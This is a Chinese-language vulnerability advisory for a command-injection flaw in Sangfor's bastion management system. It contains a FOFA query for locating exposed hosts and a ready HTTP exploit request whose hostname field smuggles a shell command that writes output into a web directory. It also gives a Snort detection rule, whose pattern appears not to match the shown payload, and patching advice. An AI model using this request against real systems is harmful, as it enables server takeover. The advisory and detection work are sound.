# 深信服运维安全管理系统protoco-session-命令执行

深信服运维安全管理系统protoco-session-命令执行，攻击者可执行任意命令导致服务器被控。

# 影响版本

深信服运维安全管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/fort/login" && header="FORTSESSIONID"

POC/EXP：

```
POST /isomp-protocol/protocol/session HTTP/1.1
Host: 127.0.0.1
Content-Length: 76
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
Access_token: null
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/hello.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
```

![image-20260122160221326](assets/image-20260122160221326.png)

![image-20260122160306622](assets/image-20260122160306622.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"深信服运维安全管理系统 - Remote Command Execution via session";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/isomp-protocol/protocol/session";
    http.header; content:"Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
    http.request_body; content:"hostname=";
    http.request_body; pcre:"/hostname=[^&]*;[^&]*>&port=/i";
    metadata:
        cve none,
        service http,
        affected_product "深信服运维安全管理系统",
        vulnerability_type "Remote Command Execution",
        severity "critical";
    classtype:web-application-attack;
    sid:1000582;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
